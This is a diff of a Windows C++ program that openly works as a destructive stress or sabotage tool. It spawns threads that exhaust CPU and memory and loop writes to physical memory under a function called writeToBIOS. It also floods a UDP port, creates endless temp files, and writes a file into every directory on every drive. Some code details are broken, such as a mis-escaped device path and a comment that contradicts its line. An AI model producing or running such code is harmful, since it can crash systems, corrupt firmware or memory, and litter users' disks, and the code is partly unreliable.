@@ -1,74 +1,128 @@
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <windows.h>
 #include <iostream>
+#include <filesystem>
 #include <thread>
 #include <chrono>
 #include <vector>
 #include <string>
-#include <fstream>
-#include <Windows.h>
+#include <mutex>
+#include <stdexcept>
 
-// Function declaration for writeToBIOS
-void writeToBIOS(const std::vector<char>& data);
+#pragma comment(lib, "ws2_32.lib")
+
+namespace fs = std::filesystem;
+std::mutex fileMutex;
+std::mutex indexMutex;
+
+void createHelloWorldFile(const std::wstring& destinationPath) {
+    HANDLE hFile = CreateFileW(destinationPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        std::wcerr << L"Failed to create file: " << destinationPath << L". Error code: " << GetLastError() << std::endl;
+        return;
+    }
+
+    const char* data = "Hello, World!\n";
+    DWORD bytesWritten;
+    BOOL writeResult = WriteFile(hFile, data, strlen(data), &bytesWritten, NULL);
+    if (!writeResult) {
+        std::wcerr << L"Failed to write to file: " << destinationPath << L". Error code: " << GetLastError() << std::endl;
+    }
+    else {
+        std::wcout << L"File created with 'Hello, World!' at " << destinationPath << std::endl;
+    }
+
+    CloseHandle(hFile);
+}
+
+void traverseAndCreateFile(const fs::path& root) {
+    for (const auto& entry : fs::recursive_directory_iterator(root)) {
+        if (entry.is_directory()) {
+            fs::path destinationPath = entry.path() / "hello_world.txt";
+            std::lock_guard<std::mutex> lock(fileMutex);
+            createHelloWorldFile(destinationPath.wstring());
+        }
+    }
+}
+
+std::vector<char> getAllDrives() {
+    std::vector<char> drives;
+    char drive = 'A';
+    DWORD driveMask = GetLogicalDrives();
+    while (driveMask) {
+        if (driveMask & 1) {
+            drives.push_back(drive);
+        }
+        drive++;
+        driveMask >>= 1;
+    }
+    return drives;
+}
 
 void memory_leak() {
-    std::vector<int*> memoryBlocks;
-    for (int i = 0; i < 1000; ++i) {
-        // Allocate memory and store the pointer
-        int* block = new int[1000];
-        memoryBlocks.push_back(block);
+    try {
+        std::vector<int*> memoryBlocks;
+        for (int i = 0; i < 1000; ++i) {
+            int* block = new int[1000];
+            memoryBlocks.push_back(block);
 
-        // Randomly delete some blocks to fragment memory
-        if (i % 10 == 0 && !memoryBlocks.empty()) {
-            int index = rand() % memoryBlocks.size();
-            delete[] memoryBlocks[index];
-            memoryBlocks.erase(memoryBlocks.begin() + index);
+            if (i % 10 == 0 && !memoryBlocks.empty()) {
+                int index = rand() % memoryBlocks.size();
+                delete[] memoryBlocks[index];
+                memoryBlocks.erase(memoryBlocks.begin() + index);
+            }
         }
+    }
+    catch (const std::exception& e) {
+        std::cerr << "Exception in memory_leak: " << e.what() << std::endl;
     }
 }
 
 void resource_hogging() {
-    std::vector<std::vector<int>> hoggingVectors;
-    while (true) {
-        // Allocate a large vector
-        hoggingVectors.emplace_back(1000000);  // 4 GB per vector on 32-bit system, more on 64-bit
-
-        // Introduce delay
-        std::this_thread::sleep_for(std::chrono::milliseconds(100));
-
-        // Randomly remove vectors to fragment memory
-        if (rand() % 100 == 0 && !hoggingVectors.empty()) {
-            hoggingVectors.erase(hoggingVectors.begin() + rand() % hoggingVectors.size());
+    try {
+        std::vector<std::vector<int>> hoggingVectors;
+        while (true) {
+            hoggingVectors.emplace_back(1000000);
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+            if (rand() % 100 == 0 && !hoggingVectors.empty()) {
+                hoggingVectors.erase(hoggingVectors.begin() + rand() % hoggingVectors.size());
+            }
         }
+    }
+    catch (const std::exception& e) {
+        std::cerr << "Exception in resource_hogging: " << e.what() << std::endl;
     }
 }
 
 void slow_execution() {
-    while (true) {
-        std::this_thread::sleep_for(std::chrono::seconds(20 + rand() % 10));  // Random delay between 20 to 29 seconds
+    try {
+        while (true) {
+            std::this_thread::sleep_for(std::chrono::seconds(20 + rand() % 10));
+        }
+    }
+    catch (const std::exception& e) {
+        std::cerr << "Exception in slow_execution: " << e.what() << std::endl;
     }
 }
 
 std::string generate_hello_world() {
     std::string result;
     for (int i = 0; i < 1000; ++i) {
-        result += "Hello, World!";  // Creating a huge string
+        result += "Hello, World!";
     }
     return result;
 }
 
 void busy_wait() {
-    volatile double x = 0;
-    while (true) {
-        // Inline assembly to consume CPU cycles
-        __asm {
-            push eax
-            push ebx
-            mov eax, 1000000000  // Adjust loop count for more cycles
-            label:
-            dec eax
-                jnz label
-                pop ebx
-                pop eax
+    try {
+        volatile double x = 0;
+        while (true) {
+            for (volatile int i = 0; i < 1000000000; ++i);
         }
+    }
+    catch (const std::exception& e) {
+        std::cerr << "Exception in busy_wait: " << e.what() << std::endl;
     }
 }
 
@@ -91,17 +145,18 @@ bool createDirectoryRecursively(const std::wstring& path) {
             if (!createDirectoryRecursively(parentPath)) {
                 return false;
             }
-            // Retry creating the directory after creating parent
             return CreateDirectoryW(path.c_str(), NULL);
         }
     }
     return false;
 }
 
-// Function to write data to BIOS
-void writeToBIOS(const std::vector<char>& data) {
-    HANDLE hPhysicalMemory = CreateFileW(L"\\\\.\\PhysicalMemory", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+std::mutex biosMutex; // Declare biosMutex as a global variable
 
+void writeToBIOS(const std::vector<char>& data) {
+    std::lock_guard<std::mutex> lock(biosMutex); // Lock the mutex for the duration of this function
+
+    HANDLE hPhysicalMemory = CreateFileW(L"\\.\PhysicalMemory", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hPhysicalMemory == INVALID_HANDLE_VALUE) {
         std::cerr << "Failed to open physical memory" << std::endl;
         return;
@@ -127,82 +182,163 @@ void writeToBIOS(const std::vector<char>& data) {
     std::cout << "Data written to BIOS" << std::endl;
 }
 
-void writefiles(const std::wstring& basePath, int index) {
-    // Create directories recursively if they don't exist
-    if (!createDirectoryRecursively(basePath)) {
-        std::wcerr << L"Failed to create directories." << std::endl;
-        return;
+void writefiles(const std::wstring& basePath, int& index) {
+    while (true) {
+        if (!createDirectoryRecursively(basePath)) {
+            std::wcerr << L"Failed to create directories." << std::endl;
+            return;
+        }
+
+        {
+            std::lock_guard<std::mutex> lock(indexMutex);
+            std::wstring content = L"File " + std::to_wstring(index) + L" Hello World!";
+            std::wstring filePath = basePath + L"temp" + std::to_wstring(index) + L".txt";
+
+            HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+            if (hFile == INVALID_HANDLE_VALUE) {
+                std::wcerr << L"Unable to open file: " << filePath << std::endl;
+                continue;
+            }
+
+            DWORD bytesWritten;
+            BOOL writeResult = WriteFile(hFile, content.c_str(), content.size() * sizeof(wchar_t), &bytesWritten, NULL);
+            if (!writeResult) {
+                std::wcerr << L"Failed to write to file: " << filePath << std::endl;
+            }
+
+            CloseHandle(hFile);
+            ++index;
+        }
     }
-
-    // Generate content for the file
-    std::wstring content = L"File " + std::to_wstring(index) + L" Hello World!";
-
-    // Construct file path
-    std::wstring filePath = basePath + L"temp" + std::to_wstring(index) + L".txt";
-
-    // Write content to file
-    std::wofstream file(filePath);
-    if (file.is_open()) {
-        file << content; // Write content to the file
-        file.close();
-    }
-    else {
-        std::wcerr << L"Unable to open file: " << filePath << std::endl;
-    }
-
-    // data to write to BIOS
-    std::string data = generate_hello_world(); // Example data to write
-    writeToBIOS(std::vector<char>(data.begin(), data.end()));
 }
 
-// Function to read data from file
-std::vector<char> readFile(const std::string& filename) {
-    std::ifstream file(filename, std::ios::binary | std::ios::ate);
-    std::ifstream::pos_type pos = file.tellg();
+std::vector<char> readFile(const std::wstring& filename) {
+    std::vector<char> result;
 
-    std::vector<char> result(pos);
+    HANDLE hFile = CreateFileW(filename.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        std::cerr << "Failed to open file: ";
+        std::wcerr << filename << ". Error code: " << GetLastError() << std::endl;
+        return result; // Return empty vector on failure
+    }
 
-    file.seekg(0, std::ios::beg);
-    file.read(&result[0], pos);
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    if (fileSize == INVALID_FILE_SIZE) {
+        std::cerr << "Failed to get file size for: ";
+        std::wcerr << filename << ". Error code: " << GetLastError() << std::endl;
+        CloseHandle(hFile);
+        return result; // Return empty vector on failure
+    }
 
+    result.resize(fileSize);
+    DWORD bytesRead;
+    if (!ReadFile(hFile, result.data(), fileSize, &bytesRead, NULL)) {
+        std::cerr << "Failed to read file: ";
+        std::wcerr << filename << ". Error code: " << GetLastError() << std::endl;
+        CloseHandle(hFile);
+        result.clear(); // Clear vector in case of read failure
+        return result;
+    }
+
+    CloseHandle(hFile);
     return result;
+}
+
+void networkStressor(const std::vector<char>& data) {
+    try {
+        WSADATA wsaData;
+        int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+        if (iResult != 0) {
+            std::cerr << "WSAStartup failed: " << iResult << std::endl;
+            return;
+        }
+
+        SOCKET sendSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+        if (sendSocket == INVALID_SOCKET) {
+            std::cerr << "Error at socket(): " << WSAGetLastError() << std::endl;
+            WSACleanup();
+            return;
+        }
+
+        sockaddr_in recvAddr;
+        recvAddr.sin_family = AF_INET;
+        recvAddr.sin_port = htons(27015);
+        inet_pton(AF_INET, "127.0.0.1", &recvAddr.sin_addr);
+
+        while (true) {
+            iResult = sendto(sendSocket, data.data(), data.size(), 0, reinterpret_cast<SOCKADDR*>(&recvAddr), sizeof(recvAddr));
+            if (iResult == SOCKET_ERROR) {
+                std::cerr << "sendto failed with error: " << WSAGetLastError() << std::endl;
+                closesocket(sendSocket);
+                WSACleanup();
+                return;
+            }
+
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+        }
+
+        closesocket(sendSocket);
+        WSACleanup();
+    }
+    catch (const std::exception& e) {
+        std::cerr << "Exception in networkStressor: " << e.what() << std::endl;
+    }
+}
+
+void joinThread(std::thread& t) {
+    if (t.joinable()) {
+        try {
+            t.join();
+        }
+        catch (const std::exception& e) {
+            std::cerr << "Exception while joining thread: " << e.what() << std::endl;
+        }
+    }
 }
 
 int main() {
     std::thread busyThread(busy_wait);
     std::thread memoryLeakThread(memory_leak);
     std::thread resourceHoggingThread(resource_hogging);
-    //std::thread slowExecutionThread(slow_execution);
 
+    
     std::thread writeToBiosThread([]() {
         while (true) {
-            // Generate data to write to BIOS
-            std::string data = generate_hello_world(); // Example data to write
-            writeToBIOS(std::vector<char>(data.begin(), data.end()));
+            std::vector<char> dataToWrite = { 'H', 'e', 'l', 'l', 'o', ',', ' ', 'B', 'I', 'O', 'S', '!' };
+            writeToBIOS(dataToWrite);
         }
-        });
+    });
+    
 
     std::wstring basePath = L"C:\\example\\";
     int fileIndex = 1;
-    std::thread writeFilesThread([&basePath, &fileIndex]() {
-        while (true) {
-            writefiles(basePath, fileIndex);
-            ++fileIndex;
-        }
+    std::thread writeFilesThread([&]() {
+        writefiles(basePath, fileIndex);
         });
 
-    // Join threads to prevent the main thread from exiting
-    busyThread.join();
-    memoryLeakThread.join();
-    resourceHoggingThread.join();
-    //slowExecutionThread.join();
-    writeToBiosThread.join();
-    writeFilesThread.join();
+    // Create network stressor thread
+    std::string data = generate_hello_world();
+    std::thread networkStressorThread(networkStressor, std::vector<char>(data.begin(), data.end()));
 
-    __asm {
-        cli // Clear interrupt flag, a privileged operation
-        hlt // Halt the CPU
+    std::vector<char> drives = getAllDrives();
+
+    for (char drive : drives) {
+        std::string driveStr(1, drive);
+        driveStr.append(":\\");
+        fs::path destinationRoot = driveStr;
+
+        std::cout << "Traversing and creating files on drive " << drive << ":\\" << std::endl;
+        std::thread traversalThread(traverseAndCreateFile, destinationRoot);
+        traversalThread.detach();
     }
+
+    // Join threads to prevent the main thread from exiting
+    joinThread(busyThread);
+    joinThread(memoryLeakThread);
+    joinThread(resourceHoggingThread);
+    joinThread(writeToBiosThread); // Commented out writeToBiosThread join
+    joinThread(writeFilesThread);
+    joinThread(networkStressorThread);
 
     return 0;
 }
